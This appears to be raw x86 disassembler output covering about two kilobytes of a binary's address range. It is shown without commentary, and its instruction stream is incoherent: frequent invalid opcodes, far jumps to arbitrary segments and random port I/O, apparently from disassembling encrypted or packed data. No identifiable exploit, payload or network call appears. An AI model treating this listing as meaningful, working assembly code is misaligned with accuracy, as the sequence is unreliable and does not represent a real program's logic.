  4129ff:	jb     0x4129af
  412a01:	rcl    BYTE PTR ds:0x4b3c2366,cl
  412a07:	loope  0x4129ad
  412a09:	mov    bh,BYTE PTR [ecx+0x9]
  412a0c:	mov    ch,BYTE PTR [ebp+ebx*4-0xfc90f35]
  412a13:	push   esi
  412a14:	lds    edx,FWORD PTR [ebx+ebx*1+0x43]
  412a18:	pushf  
  412a19:	stos   DWORD PTR es:[edi],eax
  412a1a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a1b:	jmp    0xe687:0x97f7d7dc
  412a22:	jmp    0x412a2f
  412a24:	mov    esp,0x9cfdb60d
  412a29:	fndisi(8087 only) 
  412a2b:	add    BYTE PTR [esi],ah
  412a2d:	xor    ch,BYTE PTR [esi-0xe6ec0af]
  412a33:	sub    al,BYTE PTR ds:0x8ad3c32a
  412a39:	sbb    eax,0x8b5228d2
  412a3e:	fsubr  QWORD PTR [edx]
  412a40:	xor    edx,0xdcbd32a9
  412a46:	outs   dx,DWORD PTR ds:[esi]
  412a47:	aad    0x45
  412a49:	inc    ebx
  412a4a:	ror    BYTE PTR [esi],cl
  412a4c:	out    dx,eax
  412a4d:	ror    DWORD PTR [edi],0x6e
  412a50:	and    ah,BYTE PTR [esi]
  412a52:	jne    0x4129e2
  412a54:	aaa    
  412a55:	mov    eax,ds:0x36756321
  412a5a:	out    0xc2,al
  412a5c:	retf   0xe902
  412a5f:	nop
  412a60:	sahf   
  412a61:	jp     0x412a29
  412a63:	pop    es
  412a64:	pop    ds
  412a65:	or     DWORD PTR [esi],esp
  412a67:	lea    esi,[esp+ebx*8-0x763bfea9]
  412a6e:	jno    0x412a92
  412a70:	inc    esp
  412a71:	test   al,0xcc
  412a73:	pop    ecx
  412a74:	arpl   cx,sp
  412a76:	add    al,0x6c
  412a78:	or     eax,0x698637ee
  412a7d:	rol    DWORD PTR [eax],0x60
  412a80:	sub    DWORD PTR [ecx+0x38],ebx
  412a83:	inc    ecx
  412a84:	inc    esp
  412a85:	mov    dh,0x1
  412a87:	adc    BYTE PTR [esi-0x7fe09c98],al
  412a8d:	dec    ecx
  412a8e:	imul   edx,ebx,0x53
  412a91:	push   es
  412a92:	jge    0x412a56
  412a94:	out    dx,eax
  412a95:	jbe    0x412a53
  412a97:	popf   
  412a98:	push   eax
  412a99:	dec    edi
  412a9a:	cmc    
  412a9b:	pop    es
  412a9c:	rcr    DWORD PTR [ebp+0x88d764e],cl
  412aa2:	test   eax,edx
  412aa4:	(bad)  
  412aa5:	adc    edx,DWORD PTR [ebx]
  412aa7:	pushf  
  412aa8:	(bad)  es:[esi]
  412aab:	(bad)
  412aae:	les    ecx,FWORD PTR [ecx-0x1f02a666]
  412ab4:	add    DWORD PTR [ecx+0x66f9e518],ebx
  412aba:	cdq    
  412abb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412abc:	or     al,0xc1
  412abe:	lock ins DWORD PTR es:[edi],dx
  412ac0:	mov    eax,ds:0x3afc85cc
  412ac5:	add    al,0xfe
  412ac7:	outs   dx,BYTE PTR ds:[esi]
  412ac8:	push   ebx
  412ac9:	icebp  
  412aca:	mov    esi,0x363c82ea
  412acf:	adc    eax,0x3781a7f0
  412ad4:	imul   edi,DWORD PTR gs:[ebx+0x4e89563c],0xccf6fb5d
  412adf:	add    eax,0xb7ecfd70
  412ae4:	lods   eax,DWORD PTR ds:[esi]
  412ae5:	inc    ax
  412ae7:	pop    edi
  412ae8:	cmp    dl,bh
  412aea:	rol    DWORD PTR [ecx-0x4553905e],0x22
  412af1:	mov    ecx,edx
  412af3:	div    DWORD PTR [ebp+0x3]
  412af6:	dec    eax
  412af7:	sbb    DWORD PTR [ecx],ebp
  412af9:	test   DWORD PTR [esi],0x5a0899d1
  412aff:	dec    edi
  412b00:	dec    esp
  412b01:	sbb    eax,0x82d3b5f5
  412b06:	sbb    esp,edi
  412b08:	(bad)  
  412b09:	mov    cs,WORD PTR [esi-0x149a3782]
  412b0f:	sbb    eax,DWORD PTR [ebp+0x74]
  412b12:	repnz or ch,BYTE PTR [edi]
  412b15:	jbe    0x412af3
  412b17:	pop    esi
  412b18:	xchg   edi,eax
  412b19:	xchg   ebx,eax
  412b1a:	sbb    esp,DWORD PTR [ebx+0x4b207d6f]
  412b20:	xchg   esp,eax
  412b21:	data16 jge 0x412b9e
  412b24:	jns    0x412b29
  412b26:	imul   DWORD PTR [edx-0x5f]
  412b29:	fwait
  412b2a:	sub    edi,DWORD PTR [ecx-0x1d]
  412b2d:	je     0x412b0c
  412b2f:	sbb    eax,0x7423e6d2
  412b34:	pop    ss
  412b35:	sbb    BYTE PTR [esp+eiz*4],dh
  412b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b39:	push   ds
  412b3a:	pop    ebp
  412b3b:	sbb    dl,BYTE PTR [eax-0x62]
  412b3e:	mov    edi,0x615ef341
  412b43:	int    0x5c
  412b45:	sahf   
  412b46:	shl    DWORD PTR [ebx+ecx*8],0x10
  412b4a:	jnp    0x412b9a
  412b4c:	mov    ch,0x3a
  412b4e:	mov    al,ds:0xa4c7f71c
  412b53:	xchg   edi,eax
  412b54:	adc    al,0xfd
  412b56:	add    eax,0x5ad88c37
  412b5b:	dec    ecx
  412b5c:	pop    esp
  412b5d:	and    BYTE PTR [edx+edi*2],ah
  412b60:	mov    ah,0xab
  412b62:	push   ds
  412b63:	inc    esp
  412b64:	cs jle 0x412b88
  412b67:	cmp    ebp,DWORD PTR [edx]
  412b69:	scas   eax,DWORD PTR es:[edi]
  412b6a:	push   ds
  412b6b:	clc    
  412b6c:	jecxz  0x412bd7
  412b6e:	das    
  412b6f:	cdq    
  412b70:	mov    edi,0xa6e04fd8
  412b75:	cmp    eax,0xdedcc072
  412b7a:	push   ebx
  412b7b:	sahf   
  412b7c:	and    al,0x6b
  412b7e:	sbb    DWORD PTR [ecx+0x7700dfaf],ebx
  412b84:	inc    esi
  412b85:	in     eax,dx
  412b86:	lea    edx,[ebx]
  412b88:	nop
  412b89:	and    al,0x83
  412b8b:	mov    ebp,0xad9e74d4
  412b90:	sub    DWORD PTR [ebx-0x5e],0x3f
  412b94:	dec    esi
  412b95:	and    eax,0x8b5b6f9a
  412b9a:	xchg   BYTE PTR [esi-0x64],bl
  412b9d:	loope  0x412b3d
  412b9f:	pushf  
  412ba0:	daa    
  412ba1:	fdivr  DWORD PTR [esi+0x51]
  412ba4:	outs   dx,DWORD PTR ds:[esi]
  412ba5:	cld    
  412ba6:	cmp    bh,BYTE PTR [eax+edx*8+0x4119cf95]
  412bad:	setle  BYTE PTR [ecx-0xcb49134]
  412bb4:	out    dx,al
  412bb5:	ins    DWORD PTR es:[edi],dx
  412bb6:	pop    esp
  412bb7:	sahf   
  412bb8:	nop
  412bb9:	int3   
  412bba:	ins    BYTE PTR es:[edi],dx
  412bbb:	sbb    dh,BYTE PTR [edx+0x600df7b9]
  412bc1:	cmp    BYTE PTR [eax],dh
  412bc3:	or     al,0xc9
  412bc5:	mov    ds:0x99f089d5,eax
  412bca:	sbb    eax,DWORD PTR [ecx+0x34]
  412bcd:	std    
  412bce:	inc    edx
  412bcf:	in     al,dx
  412bd0:	or     eax,edi
  412bd2:	inc    eax
  412bd3:	pop    ecx
  412bd4:	xchg   esp,eax
  412bd5:	pop    es
  412bd6:	aam    0x3
  412bd8:	arpl   WORD PTR [esi-0x348fa1f4],sp
  412bde:	and    ecx,ebp
  412be0:	mov    cl,0x8
  412be2:	ficom  WORD PTR [ebx+0x22]
  412be5:	mov    edi,0x694995af
  412bea:	mov    ah,0xce
  412bec:	jae    0x412bf0
  412bee:	xor    ch,ch
  412bf0:	xchg   DWORD PTR [ebx+0x73be3c29],edi
  412bf6:	push   ss
  412bf7:	loop   0x412c6d
  412bf9:	add    al,0x99
  412bfb:	icebp  
  412bfc:	dec    ebp
  412bfd:	xor    edx,DWORD PTR [ebx+0x6b06d805]
  412c03:	idiv   al
  412c05:	pop    esp
  412c06:	mov    WORD PTR [ebx+0x715c59d2],cs
  412c0c:	scas   eax,DWORD PTR es:[edi]
  412c0d:	stos   DWORD PTR es:[edi],eax
  412c0e:	(bad)  
  412c0f:	jns    0x412c58
  412c11:	fst    QWORD PTR [ebx+0x75]
  412c14:	in     eax,dx
  412c15:	mov    al,ds:0x3ac50a76
  412c1a:	jae    0x412c31
  412c1c:	test   al,0x35
  412c1e:	push   0x9f8683d0
  412c23:	dec    ecx
  412c24:	jns    0x412c53
  412c26:	mov    ecx,0x25a4fe88
  412c2b:	jle    0x412c36
  412c2d:	adc    DWORD PTR [edi],esi
  412c2f:	aas    
  412c30:	fdivr  QWORD PTR [ebx+0x7d4ebd1d]
  412c36:	xlat   BYTE PTR ds:[ebx]
  412c37:	ds jge 0x412c6e
  412c3a:	add    al,0x6
  412c3c:	push   ss
  412c3d:	sub    esp,edi
  412c3f:	scas   eax,DWORD PTR es:[edi]
  412c40:	sbb    al,0xab
  412c42:	shr    BYTE PTR [eax+0x107a3e24],cl
  412c48:	mov    al,0x6b
  412c4a:	aas    
  412c4b:	jmp    0xdcbc:0x6374d293
  412c52:	(bad)  
  412c53:	fsubr  DWORD PTR [esi]
  412c55:	pop    ecx
  412c56:	or     DWORD PTR ds:0xd614c9f,edx
  412c5c:	int    0xcc
  412c5e:	push   ss
  412c5f:	popf   
  412c60:	jb     0x412cae
  412c62:	repnz mov eax,ds:0x1a4bdc3b
  412c68:	scas   al,BYTE PTR es:[edi]
  412c69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412c6a:	pop    es
  412c6b:	xor    BYTE PTR [ebp+0x1af9b90b],0x71
  412c72:	pop    es
  412c73:	js     0x412bfd
  412c75:	(bad)  
  412c76:	pop    edx
  412c77:	mov    al,0xd
  412c79:	add    BYTE PTR [ecx+ebp*4+0x75],bh
  412c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c7e:	in     eax,0x8f
  412c80:	icebp  
  412c81:	stos   BYTE PTR es:[edi],al
  412c82:	pusha  
  412c83:	dec    edi
  412c84:	or     esi,DWORD PTR ds:0xd02b6dc3
  412c8a:	iret   
  412c8b:	fimul  WORD PTR [ebx-0x62]
  412c8e:	cli    
  412c8f:	jg     0x412c94
  412c91:	sub    eax,0x6ad8011
  412c96:	mov    WORD PTR [ecx+0x79b13d29],cs
  412c9c:	pop    ebx
  412c9d:	iret   
  412c9e:	jo     0x412c67
  412ca0:	(bad)  
  412ca1:	add    al,0xcb
  412ca3:	aas    
  412ca4:	adc    al,0x9d
  412ca6:	jb     0x412cef
  412ca8:	fs loop 0x412c98
  412cab:	pop    es
  412cac:	mov    ebx,0x23da40c1
  412cb1:	fs dec ebx
  412cb3:	sbb    al,0xd8
  412cb5:	mov    WORD PTR [ebx+0x71d66b11],cs
  412cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cbc:	ret    0xcf2d
  412cbf:	mov    esi,0x13450160
  412cc4:	adc    eax,DWORD PTR [edx+0x45]
  412cc7:	xchg   ebx,eax
  412cc8:	int    0x95
  412cca:	mov    cl,ah
  412ccc:	mov    esp,0xd786ace2
  412cd1:	push   ecx
  412cd2:	outs   dx,DWORD PTR ds:[esi]
  412cd3:	imul   ecx,ebp,0xffffff97
  412cd6:	mov    WORD PTR [ebx+0x28aa4a19],?
  412cdc:	add    eax,0x3f874631
  412ce1:	pop    edx
  412ce2:	ret    
  412ce3:	inc    al
  412ce5:	mov    edi,0x607ecbc5
  412cea:	mov    ds:0xfe5d3d4b,eax
  412cef:	sub    al,0xa0
  412cf1:	hlt    
  412cf2:	ret    0x7f3c
  412cf5:	add    DWORD PTR [edx],eax
  412cf7:	leave  
  412cf8:	loop   0x412d19
  412cfa:	cmp    al,dl
  412cfc:	cmp    al,0x1
  412cfe:	sub    dh,BYTE PTR [ecx-0x720e850d]
  412d04:	dec    ebx
  412d05:	mov    ch,0x58
  412d07:	inc    edx
  412d08:	loope  0x412d2f
  412d0a:	(bad)  
  412d0b:	sub    BYTE PTR [edx],cl
  412d0d:	mov    ch,0xef
  412d0f:	push   eax
  412d10:	test   DWORD PTR [eax+0x14],esp
  412d13:	scas   eax,DWORD PTR es:[edi]
  412d14:	sbb    ecx,DWORD PTR [ebx]
  412d16:	cwde   
  412d17:	xchg   esi,eax
  412d18:	aam    0x62
  412d1a:	fistp  WORD PTR [eax]
  412d1c:	mov    ebp,0x53d7feb
  412d21:	test   BYTE PTR [ebp+eax*4+0x5c],bh
  412d25:	dec    edi
  412d26:	xlat   BYTE PTR ds:[ebx]
  412d27:	mov    ebx,0xcfb475a1
  412d2c:	fadd   DWORD PTR [esi-0x35]
  412d2f:	aas    
  412d30:	sahf   
  412d31:	or     al,0xe3
  412d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d34:	mov    DWORD PTR [esi-0x1a],edx
  412d37:	inc    ebp
  412d38:	cmc    
  412d39:	scas   al,BYTE PTR es:[edi]
  412d3a:	pop    ebx
  412d3b:	and    BYTE PTR [ecx-0x7e2ae840],ah
  412d41:	or     eax,0x7a9d565c
  412d46:	adc    esi,ebx
  412d48:	mov    ds:0xe61df302,al
  412d4d:	lock out dx,eax
  412d4f:	add    DWORD PTR [esi-0x3a],0xf287f735
  412d56:	jle    0x412d2d
  412d58:	cmp    bh,BYTE PTR [edx*8-0x4f5982e8]
  412d5f:	sub    BYTE PTR [ebx+esi*8-0x4e],bh
  412d63:	push   0xffffffb1
  412d65:	pusha  
  412d66:	jg     0x412d93
  412d68:	mov    esp,DWORD PTR [esi-0x1c]
  412d6b:	mov    ebp,0xcbf93429
  412d70:	fs add al,0x49
  412d73:	je     0x412daa
  412d75:	ret    0x3ea4
  412d78:	sahf   
  412d79:	jmp    0x2f87:0x1f3e896e
  412d80:	jnp    0x412d7c
  412d82:	jge    0x412d38
  412d84:	xor    al,0x65
  412d86:	sahf   
  412d87:	and    BYTE PTR [ecx],bh
  412d89:	out    dx,eax
  412d8a:	loope  0x412d5c
  412d8c:	in     al,0x67
  412d8e:	cli    
  412d8f:	push   es
  412d90:	jge    0x412d62
  412d92:	sub    eax,edx
  412d94:	mov    BYTE PTR [eax+0x3a],dl
  412d97:	pop    ds
  412d98:	int3   
  412d99:	and    eax,0x6501d3d0
  412d9e:	mov    eax,ds:0x78446ee3
  412da3:	push   ebp
  412da4:	dec    edx
  412da5:	repz jbe 0x412d64
  412da8:	fisub  DWORD PTR [ecx+0x59c495bb]
  412dae:	(bad)  
  412daf:	mov    ch,0x6
  412db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412db2:	test   eax,0x8da13541
  412db7:	push   es
  412db8:	unpcklps xmm7,xmm4
  412dbb:	jl     0x412dd4
  412dbd:	in     al,0xd8
  412dbf:	out    dx,al
  412dc0:	sub    eax,0xf03bdbf6
  412dc5:	(bad)  
  412dc6:	cmp    ecx,ebx
  412dc8:	xor    BYTE PTR [ebx+0x3b],ch
  412dcb:	jmp    0x7a875037
  412dd0:	es push edi
  412dd2:	out    0x1,al
  412dd4:	push   ebp
  412dd5:	test   DWORD PTR [edx-0x7fc69ba1],esp
  412ddb:	cmp    DWORD PTR [ecx-0x45],ebp
  412dde:	xor    DWORD PTR [ebx*1+0x94485aa],edx
  412de5:	retf   
  412de6:	jecxz  0x412db3
  412de8:	sahf   
  412de9:	inc    esi
  412dea:	xchg   ebp,eax
  412deb:	(bad)  
  412dec:	jle    0x412d87
  412dee:	push   esi
  412def:	pop    ecx
  412df0:	ror    DWORD PTR [esi+0x37],0xf
  412df4:	jae    0x412e6c
  412df6:	mov    eax,ds:0x405e1710
  412dfb:	(bad)  
  412dfc:	pop    ebp
  412dfd:	pop    eax
  412dfe:	xchg   edi,eax
  412dff:	fincstp 
  412e01:	dec    edx
  412e02:	out    0x42,al
  412e04:	adc    ebp,DWORD PTR [esi+0x73]
  412e07:	jno    0x412e81
  412e09:	sub    ebp,DWORD PTR [bp+si+0x1b]
  412e0d:	and    DWORD PTR [edx-0x1c84a8cf],esp
  412e13:	jmp    0x412e54
  412e15:	js     0x412e6c
  412e17:	call   0xb9d93cbd
  412e1c:	inc    ebp
  412e1d:	les    ebx,FWORD PTR [ecx*4+0x36a0dd6b]
  412e24:	mov    ebp,DWORD PTR [edi]
  412e26:	xor    ebp,DWORD PTR [edi]
  412e28:	xchg   esp,eax
  412e29:	or     ah,BYTE PTR ds:0xdad41bc0
  412e2f:	retf   0xb32b
  412e32:	mov    bl,0x23
  412e34:	or     edi,DWORD PTR [ebx-0x18950d9d]
  412e3a:	(bad)  
  412e3b:	jbe    0x412e68
  412e3d:	gs pusha 
  412e3f:	mov    ds:0x483fd9d1,eax
  412e44:	sti    
  412e45:	xlat   BYTE PTR ds:[ebx]
  412e46:	shl    BYTE PTR [eax],1
  412e48:	mov    ebp,0x2ebe149
  412e4d:	adc    esi,edi
  412e4f:	fwait
  412e50:	test   DWORD PTR [ebx-0x6361b42f],edx
  412e56:	or     esp,DWORD PTR [ecx]
  412e58:	or     cl,dl
  412e5a:	and    DWORD PTR [edx+0x78],edi
  412e5d:	int3   
  412e5e:	outs   dx,BYTE PTR fs:[esi]
  412e60:	mov    cl,0x6
  412e62:	out    dx,eax
  412e63:	xchg   ebp,eax
  412e64:	clc    
  412e65:	or     DWORD PTR [edi+0x2af7bc02],0x5e1231e1
  412e6f:	add    ecx,DWORD PTR [ebx+0x24]
  412e72:	dec    ebp
  412e73:	rcl    DWORD PTR [ebx],cl
  412e75:	and    dh,BYTE PTR [eax+0x4e]
  412e78:	mov    eax,0x73363479
  412e7d:	call   0x3089:0x11211b09
  412e84:	inc    DWORD PTR [esi+0x69d12338]
  412e8a:	xchg   ecx,eax
  412e8b:	add    al,0x6d
  412e8d:	jmp    0x412ecc
  412e8f:	test   DWORD PTR [esi+edx*2+0x32],0x98043ed7
  412e97:	dec    edi
  412e98:	jmp    0x412eed
  412e9a:	push   esp
  412e9b:	cmp    DWORD PTR [eax],ecx
  412e9d:	mov    ds:0x78267929,al
  412ea2:	xor    al,0x87
  412ea4:	mov    esp,0xf6c2f8bb
  412ea9:	(bad)  
  412eaa:	popa   
  412eab:	and    BYTE PTR [eax+0x4e],al
  412eae:	jmp    0xb30da367
  412eb3:	adc    DWORD PTR [edx-0x67036e0a],ebp
  412eb9:	sbb    al,0xaf
  412ebb:	je     0x412edc
  412ebd:	sub    eax,0xf287624f
  412ec2:	lods   al,BYTE PTR ds:[esi]
  412ec3:	stos   BYTE PTR es:[edi],al
  412ec4:	mov    cl,0xf8
  412ec6:	mov    bh,0xc2
  412ec8:	sub    eax,0xdb2bee61
  412ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ece:	mov    DWORD PTR [edi],0x5c514fd1
  412ed4:	jle    0x412f37
  412ed6:	push   cs
  412ed7:	push   edi
  412ed8:	dec    edi
  412ed9:	into   
  412eda:	dec    eax
  412edb:	aad    0x4e
  412edd:	into   
  412ede:	call   0x176f:0x635566d0
  412ee5:	or     BYTE PTR [ebp+0x7097c717],dl
  412eeb:	push   edx
  412eec:	(bad)  
  412eed:	and    al,BYTE PTR [ecx+eax*1+0x20]
  412ef1:	add    al,0x7d
  412ef3:	cmp    BYTE PTR [esp+esi*2+0x6bf8db5f],ah
  412efa:	int    0x2c
  412efc:	adc    DWORD PTR [edi+0x14],eax
  412eff:	loope  0x412f68
  412f01:	jmp    0x369d:0x2c66c614
  412f08:	mov    cl,0x5e
  412f0a:	popa   
  412f0b:	jmp    0x412ebb
  412f0d:	xlat   BYTE PTR ds:[ebx]
  412f0e:	jns    0x412f45
  412f10:	push   ebp
  412f11:	jne    0x412f25
  412f13:	cmp    BYTE PTR [esp+ebp*2+0x3463e356],0x6e
  412f1b:	mov    ah,0x57
  412f1d:	ja     0x412ef9
  412f1f:	cli    
  412f20:	cwde   
  412f21:	push   edi
  412f22:	and    ebp,ebx
  412f24:	cmp    BYTE PTR [ebx+0x59a4e1f5],dh
  412f2a:	cli    
  412f2b:	mov    ebx,0x967c68e4
  412f30:	jo     0x412ec1
  412f32:	xchg   ebp,eax
  412f33:	inc    eax
  412f34:	fdivr  DWORD PTR [ebx]
  412f36:	pop    ds
  412f37:	inc    edx
  412f38:	pop    ecx
  412f39:	xor    BYTE PTR [ebp+ebp*2-0x6b],0x23
  412f3e:	call   0xfc299296
  412f43:	rep outs dx,DWORD PTR ds:[esi]
  412f45:	or     eax,0x6f00d550
  412f4a:	push   0xffffffbe
  412f4c:	xchg   DWORD PTR [esi+0x58],ebp
  412f4f:	inc    esi
  412f50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f51:	int    0x6d
  412f53:	rcl    BYTE PTR [edx+0x3b],1
  412f56:	scas   eax,DWORD PTR es:[edi]
  412f57:	loop   0x412fcd
  412f59:	(bad)  
  412f5a:	adc    DWORD PTR [edx+0x5a],edx
  412f5d:	loopne 0x412ee7
  412f5f:	adc    dh,BYTE PTR [edx+ebp*2]
  412f62:	push   ebp
  412f63:	enter  0x3ea4,0x3c
  412f67:	aaa    
  412f68:	int3   
  412f69:	inc    ebx
  412f6a:	add    bh,BYTE PTR [ebp-0x32]
  412f6d:	add    edi,DWORD PTR [ebx]
  412f6f:	jnp    0x412f05
  412f71:	out    dx,eax
  412f72:	dec    eax
  412f73:	jmp    0x1c62f5b3
  412f78:	sbb    al,0xca
  412f7a:	pop    ecx
  412f7b:	jnp    0x412fb3
  412f7d:	ret    0xd3dc
  412f80:	or     al,0x42
  412f82:	add    eax,0xbe85b283
  412f87:	mov    al,0xd7
  412f89:	sub    bh,ah
  412f8b:	aas    
  412f8c:	cmp    ebx,edx
  412f8e:	inc    ecx
  412f8f:	dec    edx
  412f90:	retf   0x8e77
  412f93:	xchg   al,dl
  412f95:	test   al,0x10
  412f97:	push   esp
  412f98:	aad    0x14
  412f9a:	rcl    BYTE PTR [ebx],1
  412f9c:	repnz out dx,al
  412f9e:	dec    eax
  412f9f:	sub    DWORD PTR [eax],0x54
  412fa2:	mov    edx,0x5fc29be9
  412fa7:	mov    edi,edx
  412fa9:	shr    DWORD PTR [edi+esi*8-0x723f12be],0x58
  412fb1:	in     eax,0xcf
  412fb3:	hlt    
  412fb4:	mov    bl,bh
  412fb6:	mov    ah,al
  412fb8:	jbe    0x412f40
  412fba:	fiadd  DWORD PTR [edx+0x4c]
  412fbd:	dec    edx
  412fbe:	aam    0x12
  412fc0:	inc    ecx
  412fc1:	arpl   ax,ax
  412fc3:	aad    0x9f
  412fc5:	iret   
  412fc6:	daa    
  412fc7:	pushfw 
  412fc9:	jg     0x412fbc
  412fcb:	ins    BYTE PTR es:[edi],dx
  412fcc:	test   dh,bl
  412fce:	and    al,0x56
  412fd0:	mov    cl,BYTE PTR [ebx-0x3dd57461]
  412fd6:	stc    
  412fd7:	sub    al,bh
  412fd9:	pop    DWORD PTR [eax-0x73ba314f]
  412fdf:	pop    edx
  412fe0:	pop    ebx
  412fe1:	or     bl,BYTE PTR [esi]
  412fe3:	sub    ebx,DWORD PTR [eax]
  412fe5:	dec    ebx
  412fe6:	js     0x412ffb
  412fe8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fea:	outs   dx,BYTE PTR ds:[esi]
  412feb:	repz dec ecx
  412fed:	inc    esp
  412fee:	(bad)  [eax-0x66]
  412ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff2:	sar    DWORD PTR [ebx],cl
  412ff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ff5:	push   0xffffffa0
  412ff7:	or     al,0x6f
  412ff9:	and    DWORD PTR [eiz*1+0x56af4367],ebx
  413000:	ret    
  413001:	idiv   DWORD PTR [ebp-0x3c506802]
  413007:	shl    BYTE PTR [ebx-0x481d2a96],1
  41300d:	sbb    al,0xbc
  41300f:	sub    eax,0x1da19e40
  413014:	and    al,BYTE PTR [esi+eiz*8+0x7a]
  413018:	(bad)  
  413019:	out    0xc5,al
  41301b:	out    0x6e,eax
  41301d:	addr16 stc 
  41301f:	ret    
  413020:	sti    
  413021:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413022:	inc    ebx
  413023:	xor    ch,BYTE PTR [eax]
  413025:	imul   esp,edi,0x4b0629d7
  41302b:	rcr    BYTE PTR [ebx+0x5556286a],cl
  413031:	(bad)  
  413032:	jns    0x4130a0
  413034:	imul   esp,esi,0x205a98f0
  41303a:	je     0x41300e
  41303c:	and    BYTE PTR [eax-0x5a],ah
  41303f:	iret   
  413040:	cld    
  413041:	pop    ebp
  413042:	dec    esi
  413043:	cmp    al,0xf9
  413045:	loopne 0x412fdc
  413047:	push   cs
  413048:	push   0x799bed01
  41304d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41304e:	xchg   edi,eax
  41304f:	and    edx,DWORD PTR [edx+0xa]
  413052:	jg     0x41304b
  413054:	pop    ebp
  413055:	adc    eax,0xd1112d50
  41305a:	fdiv   DWORD PTR [esp+eax*4]
  41305d:	stos   DWORD PTR es:[edi],eax
  41305e:	ja     0x4130b7
  413060:	les    edi,FWORD PTR [eax-0x50]
  413063:	jnp    0x41301c
  413065:	cld    
  413066:	loope  0x4130cd
  413068:	(bad)  [edx-0x795034ba]
  41306e:	and    eax,0x3fc4f3b9
  413073:	addr16 sbb eax,0x1ade0bb1
  413079:	jmp    0xfaf32c2e
  41307e:	jnp    0x413003
  413080:	pop    ss
  413081:	jo     0x413087
  413083:	add    ebx,ebx
  413085:	jle    0x413100
  413087:	inc    ecx
  413088:	cli    
  413089:	mov    ecx,0xc2d4c88a
  41308e:	sub    ah,BYTE PTR [eax-0x42]
  413091:	xor    DWORD PTR [edx+0x33],ecx
  413094:	(bad)
  413098:	daa    
  413099:	fidiv  DWORD PTR ds:0xa12309fb
  41309f:	cmc    
  4130a0:	push   edx
  4130a1:	frstpm(287 only) 
  4130a3:	sub    eax,0x2c1e3131
  4130a8:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4130aa:	xor    eax,0xe89ebe48
  4130af:	sbb    ebp,DWORD PTR [eax+eax*8]
  4130b2:	mov    eax,ds:0x6945a7b2
  4130b7:	mov    dh,0x87
  4130b9:	adc    eax,0xb943992f
  4130be:	dec    ebx
  4130bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4130c0:	test   DWORD PTR [ecx+0x7a],esp
  4130c3:	ds out 0xd3,eax
  4130c6:	xchg   al,bh
  4130c8:	aad    0x6a
  4130ca:	sbb    dh,BYTE PTR [ebx-0x4885a61d]
  4130d0:	cmp    BYTE PTR [ebp-0x18],bl
  4130d3:	mov    cl,0xde
  4130d5:	(bad)  
  4130d7:	mov    eax,0x9065bb6f
  4130dc:	sti    
  4130dd:	fwait
  4130de:	ja     0x413130
  4130e0:	imul   ecx,DWORD PTR [edi+0x5a],0xffffffaa
  4130e4:	int3   
  4130e5:	shr    BYTE PTR [edx-0x29b166cb],1
  4130eb:	xor    DWORD PTR [ebx+0x341d77ab],0xd3206f40
  4130f5:	and    eax,0xd4348e7c
  4130fa:	jecxz  0x4130f4
  4130fc:	mov    cl,0xd1
  4130fe:	stos   BYTE PTR es:[edi],al
  4130ff:	test   al,0x25
  413101:	jnp    0x4130fa
  413103:	and    al,0x48
  413105:	push   0x1a33b050
  41310a:	xor    BYTE PTR [edx-0x55f6a333],bl
  413110:	scas   eax,DWORD PTR es:[edi]
  413111:	mov    al,0xfd
  413113:	in     eax,dx
  413114:	loop   0x4130af
  413116:	push   ecx
  413117:	xor    BYTE PTR [esi+0x54],0xc
  41311b:	not    BYTE PTR [edi+eiz*1]
  41311e:	popa   
  41311f:	cmp    BYTE PTR [edi+0x4a],bh
  413122:	mov    bl,0xf8
  413124:	sti    
  413125:	mov    esp,0x62b852e0
  41312a:	js     0x4130d3
  41312c:	nop
  41312d:	and    eax,0x34d0c18c
  413132:	or     al,0xe9
  413134:	mov    DWORD PTR ds:0xbd623d3b,edx
  41313a:	jne    0x4131b9
  41313c:	ins    BYTE PTR es:[edi],dx
  41313d:	fs mov cl,al
  413140:	dec    ebp
  413141:	mov    ch,0x86
  413143:	fist   DWORD PTR [eax]
  413145:	popa   
  413146:	cmp    ecx,DWORD PTR [ecx+0x51]
  413149:	adc    DWORD PTR [ebx-0x60],0x3d24031e
  413150:	imul   edx,DWORD PTR [ebp-0x2a],0x40
  413154:	sub    al,0x9a
  413156:	jnp    0x4130e7
  413158:	sbb    dl,dh
  41315a:	sbb    al,0x7c
  41315c:	fs test al,0x43
  41315f:	sbb    ah,BYTE PTR [eax]
  413161:	mov    esp,0x4dfaf6f4
  413166:	icebp  
  413167:	adc    bl,BYTE PTR [ebx+0x5c]
  41316a:	rcl    cl,0x20
  41316d:	or     ecx,DWORD PTR [esi]
  41316f:	test   al,0x1b
  413171:	iret   
  413172:	xchg   al,ch
  413174:	bound  eax,QWORD PTR [edx+0x56]
  413177:	shr    DWORD PTR [edi+0x6f1af57c],1
  41317d:	into   
  41317e:	xchg   edx,eax
  41317f:	mov    dh,0x33
  413181:	shl    BYTE PTR [esi+edx*2],1
  413184:	add    bl,BYTE PTR [esi]
  413186:	xchg   edi,eax
  413187:	cli    
  413188:	sti    
  413189:	icebp  
  41318a:	clc    
  41318b:	add    eax,0xd25fee8c
  413190:	pop    esi
  413191:	mov    dh,BYTE PTR [eax+0x5f11bc2b]
  413197:	es sub al,0xb0
  41319a:	xor    ebx,DWORD PTR [esp+eiz*2+0x5af3b228]
  4131a1:	cmc    
  4131a2:	sbb    BYTE PTR ds:0x5215b1c3,ch
  4131a8:	xchg   esp,eax
  4131a9:	and    eax,0x6c4c8da3
  4131ae:	push   0x62788a97
  4131b3:	push   0x39
